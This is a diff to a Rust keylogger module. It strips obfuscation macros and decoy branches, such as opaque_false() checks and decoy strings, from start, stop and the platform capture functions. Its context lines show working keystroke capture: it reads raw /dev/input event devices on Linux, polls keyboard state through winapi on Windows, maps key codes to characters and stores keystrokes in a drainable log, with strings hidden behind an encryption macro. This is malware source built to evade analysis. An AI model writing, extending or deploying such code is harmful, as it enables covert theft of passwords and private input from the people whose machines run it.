@@ -1,4 +1,4 @@
-use encstr::{astr, cobl, opaque_false};
+use encstr::astr;
 use std::sync::{
     Arc, Mutex,
     atomic::{AtomicBool, Ordering},
@@ -22,12 +22,6 @@ impl Keylogger {
     }
 
     pub fn start(&mut self) {
-        cobl!({
-        if opaque_false() {
-            self.running.store(false, Ordering::SeqCst);
-            return;
-        }
-
         if self.running.load(Ordering::SeqCst) {
             return;
         }
@@ -40,19 +34,13 @@ impl Keylogger {
             #[cfg(target_os = "windows")]
             keylogger_windows(data, running);
         }));
-        })
     }
 
     pub fn stop(&mut self) {
-        cobl!({
-        if opaque_false() {
-            let _ = astr!("decoy_stop");
-        }
         self.running.store(false, Ordering::SeqCst);
         if let Some(handle) = self.handle.take() {
             let _ = handle.join();
         }
-        })
     }
 
     pub fn drain_log(&mut self) -> String {
@@ -80,14 +68,9 @@ fn timestamp() -> String {
 
 #[cfg(target_os = "linux")]
 fn keylogger_linux(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
-    cobl!({
     use std::fs::{File, read_dir};
     use std::io::Read;
     use std::os::unix::io::AsRawFd;
-
-    if opaque_false() {
-        let _f = astr!("/dev/null");
-    }
 
     let ev_dir = astr!("/dev/input");
     let mut devices: Vec<File> = Vec::new();
@@ -157,7 +140,6 @@ fn keylogger_linux(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
             }
         }
     }
-    })
 }
 
 #[cfg(target_os = "linux")]
@@ -237,17 +219,17 @@ fn linux_key_to_char(code: u16) -> String {
         72 => astr!("[HOME]"),
         73 => astr!("[UP]"),
         74 => astr!("[PGUP]"),
-        75 => astr!("-"), // keypad minus
+        75 => astr!("-"),
         76 => astr!("[LEFT]"),
         77 => astr!("[CENTER]"),
         78 => astr!("[RIGHT]"),
-        79 => astr!("+"), // keypad plus
+        79 => astr!("+"),
         80 => astr!("[END]"),
         81 => astr!("[DOWN]"),
         82 => astr!("[PGDN]"),
         83 => astr!("[INS]"),
         84 => astr!("[DEL]"),
-        85 => astr!(""), // mute/unused
+        85 => astr!(""),
         86 => astr!("\\"),
         87 => astr!("[F11]"),
         88 => astr!("[F12]"),
@@ -301,11 +283,6 @@ fn linux_key_to_char(code: u16) -> String {
 
 #[cfg(target_os = "windows")]
 fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
-    cobl!({
-    if opaque_false() {
-        let _ = astr!("decoy_windows");
-        return;
-    }
     use winapi::shared::minwindef::UINT;
     use winapi::um::winuser::GetKeyboardState;
     use winapi::um::winuser::{
@@ -385,7 +362,6 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
         }
         thread::sleep(Duration::from_millis(10));
     }
-    })
 }
 
 #[cfg(target_os = "windows")]
